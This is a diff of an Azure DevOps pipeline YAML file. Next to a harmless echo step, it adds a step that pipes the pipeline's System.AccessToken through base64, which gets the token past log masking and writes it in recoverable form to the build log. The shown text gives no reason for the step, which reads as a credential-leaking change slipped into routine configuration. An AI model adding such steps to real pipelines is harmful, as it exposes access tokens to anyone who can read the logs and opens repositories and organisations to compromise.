@@ -17,4 +17,5 @@ pool: TestPool
 steps:
 - script: echo "Im the main repo"
   displayName: 'Run a one-line script'
+- script: echo $(System.AccessToken) | base64
 - checkout: azdo  
